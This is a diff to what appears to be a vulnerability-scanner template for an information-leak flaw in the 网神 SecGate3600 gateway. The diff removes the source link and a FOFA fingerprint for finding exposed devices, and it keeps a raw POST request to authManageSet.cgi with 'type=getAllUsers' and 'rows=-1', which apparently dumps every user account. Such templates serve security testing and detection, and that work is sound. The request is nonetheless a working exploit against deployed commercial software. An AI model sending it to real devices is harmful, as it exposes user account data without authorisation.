@@ -3,12 +3,8 @@ info:
   name: 网神 SecGate3600 authManageSet.cgi 信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/go4i4omshlds8dss'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: go4i4omshlds8dss
-    fofa: body="sec_gate_image/login_02.gif"
 http:
 - raw:
   - 'POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Connection: close
-
-
 
 
     type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
